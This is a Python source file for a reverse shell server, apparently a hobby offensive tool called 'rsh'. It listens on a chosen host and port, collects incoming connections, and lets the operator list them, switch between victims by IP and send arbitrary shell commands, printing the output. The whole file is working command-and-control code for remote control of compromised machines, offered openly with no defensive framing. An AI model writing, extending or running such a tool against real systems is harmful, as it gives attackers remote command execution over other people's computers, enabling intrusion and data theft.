import socket
import sys
import threading
from colorama import init
from termcolor import colored

init()

print(colored("""          _     
 _ __ ___| |__  
| '__/ __| '_ \ 
| |  \__ \ | | |
|_|  |___/_| |_|""", "green"))

connections = []
server_global = []

def start_server(server,host,port):
    try:
        server.listen()
        print(colored(f"\n[INFO] Server started on {host}:{port}", "green"))
        while True:
            conn, addr = server.accept()
            connections.append([addr, conn])
            print(colored(f"[INFO] Connection from {addr[0]}", "green"))
    except Exception as e:
        if not str(e).startswith("[WinError 10038]"):
            print(colored(f"\n[ERROR] {e}", "red"))

def send_cmd(conn, cmd):
    try:
        conn.send(cmd.encode("utf-8"))
        output = conn.recv(2048).decode("utf-8")
        return output
    except Exception as e:
        print(colored(f"[ERROR] {e}", "red"))

def main():
    server_on = False
    while True:
        try:
            print(colored("\ns) Start the reverse shell server", "green"))
            print(colored("v) Program version", "green"))
            print(colored("q) Quit", "green"))

            print(colored("\n>>>", "green"), end="")
            choice = input()

            if choice == "q":
                break
            elif choice == "v":
                print(colored("\nVersion: 1.0", "green"))
            elif choice == "s":
                print(colored("\nEnter the host: ", "green"), end="")
                host = input()
                print(colored("Enter the port: ", "green"), end="")
                port = input()

                # Initliaze the server
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.bind((host, int(port)))

                # Start the server thread
                server_process = threading.Thread(target=start_server, args=(server,host,port))
                server_process.start()
                server_on = True
                
                # Server inputs loop
                current_conn = None
                while True:
                    choice = input("")

                    if choice == "connections" or choice == "conns":
                        print(colored(connections, "green"))
                    elif choice.split(" ")[0] == "switch":
                        if current_conn is not None:
                            current_conn = None
                        
                        current_conn = choice.split(" ")[1]

                    elif choice.split(" ")[0] == "cmd":
                        if current_conn is not None:
                            conn = None
                            for connection in connections:
                                if connection[0][0] == current_conn:
                                    conn = connection[1]
                            print("\n" + send_cmd(conn, choice[3:]))


            else:
                print(colored("\nInvalid option", "red"))

        except KeyboardInterrupt:
            if server_on:
                print(colored("[INFO] Closing server...", "green"))
                try:
                    server.close()
                except:
                    pass
            break

main()